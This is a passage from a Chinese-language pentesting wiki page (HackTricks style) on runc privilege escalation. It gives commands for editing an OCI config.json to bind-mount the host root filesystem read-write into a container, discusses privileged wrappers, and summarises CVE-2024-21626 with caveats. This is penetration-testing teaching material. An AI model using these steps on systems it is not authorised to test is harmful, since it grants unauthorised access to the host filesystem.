# RunC 权限提升

{{#include ../../banners/hacktricks-training.md}}

## 基本信息

如果你想进一步了解 **runc**，请查看以下页面：

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

如果主机上的 rootful 进程可以使用 `runc`，你可以使用一个 OCI bundle，其挂载配置会将主机的 `/` 递归 bind-mount 到容器内的 `/`，从而在该挂载命名空间中暴露主机文件系统。<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
    "type": "bind",
    "source": "/",
    "destination": "/",
    "options": [
        "rbind",
        "rw",
        "rprivate"
    ]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```

> [!CAUTION]
> 文档中记载的 `runc run` 工作流以 root 身份运行：runc 自身的示例将其标注为“以 root 身份运行”。非特权用户需要使用 rootless 配置，例如 `runc spec --rootless`；runc 文档指出，此模式必须启用 user namespaces。<sup>[[1]](#references)</sup>

## 特权包装器与运行时版本

如果特权包装器接受调用者可控的 OCI bundle，且允许不安全的 bind mounts，就可能暴露主机文件。请检查包装器是否会在验证挂载源和目标之前解析路径遍历和符号链接，以及是否会限制 `process.cwd`。仅有一条 sudo 规则或一个可写的 `config.json`，并不能证明包装器会接受该 bundle，或以主机特权运行它。

此外，[CVE-2024-21626](https://github.com/opencontainers/runc/security/advisories/GHSA-xr7r-f8xq-vfvv) 影响上游 `runc` 的 `1.0.0-rc93` 至 `1.1.11` 版本；`1.1.12` 包含上游修复。在某些 `runc run` 或 `runc exec` 工作流中，泄露的文件描述符和不充分的工作目录验证可能导致容器进程运行在其 root 目录之外。文件描述符编号取决于调用方式；如果供应商已回移修复，或调用者无法影响特权运行时调用，仅凭版本字符串无法判定是否可利用。

## References

- [1] [runc：用于生成和运行容器的 CLI 工具](https://github.com/opencontainers/runc#using-runc)
- [2] [OCI Runtime Specification：挂载](https://github.com/opencontainers/runtime-spec/blob/main/config.md#mounts)
- [3] [共享子树](https://docs.kernel.org/filesystems/sharedsubtree.html)
{{#include ../../banners/hacktricks-training.md}}
